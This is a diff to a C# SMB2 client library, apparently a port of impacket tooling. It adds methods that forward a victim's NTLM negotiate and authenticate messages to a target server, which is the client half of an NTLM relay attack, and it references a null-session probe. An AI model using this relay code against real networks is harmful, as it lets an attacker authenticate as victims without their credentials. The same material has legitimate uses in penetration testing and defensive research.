@@ -212,6 +212,44 @@ public sealed class Smb2Client : IDisposable
     }
 
     /// <summary>
+    /// Relay client side (ntlmrelayx): sends the victim's NTLM NEGOTIATE (Type 1) to the target in a
+    /// SESSION_SETUP and returns the target's CHALLENGE (Type 2) to hand back to the victim. Call after
+    /// <see cref="Negotiate"/> on the target connection. The challenge is the target's, so the victim's
+    /// AUTHENTICATE will be computed against it — the essence of the relay.
+    /// </summary>
+    public byte[] RelayChallenge(byte[] victimType1)
+    {
+        byte[] spnegoInit = Spnego.WrapInitialToken(victimType1);
+        (_, byte[] response1) = SendSessionSetup(spnegoInit, sessionId: 0);
+
+        var header1 = new Smb2Header();
+        header1.Unpack(response1);
+        _sessionId = header1.SessionId;
+
+        var setup1 = new Smb2SessionSetupResponse();
+        setup1.Unpack(response1);
+        return Spnego.ExtractResponseToken(setup1.SecurityBuffer);
+    }
+
+    /// <summary>
+    /// Relay client side (ntlmrelayx): forwards the victim's NTLM AUTHENTICATE (Type 3) and optional
+    /// SPNEGO mechListMIC to the target in the second SESSION_SETUP, and returns the target's NT status
+    /// (SUCCESS means the relay authenticated as the victim against the target).
+    /// </summary>
+    public uint RelayAuthenticate(byte[] victimType3, byte[]? victimMechListMic)
+    {
+        byte[] spnegoResp = Spnego.WrapResponseToken(victimType3, victimMechListMic);
+        (_, byte[] response2) = SendSessionSetup(spnegoResp, _sessionId);
+
+        var header2 = new Smb2Header();
+        header2.Unpack(response2);
+        return header2.Status;
+    }
+
+    /// <summary>The session id the target assigned during the relayed SESSION_SETUP.</summary>
+    public ulong SessionId => _sessionId;
+
+    /// <summary>
     /// Runs the credential-less NTLM-info probe (impacket <c>DumpNTLMInfo.py</c>): an
     /// anonymous SESSION_SETUP whose CHALLENGE discloses the host/domain/DNS names and OS
     /// build, followed by a blank-credential AUTHENTICATE to test whether a null session is
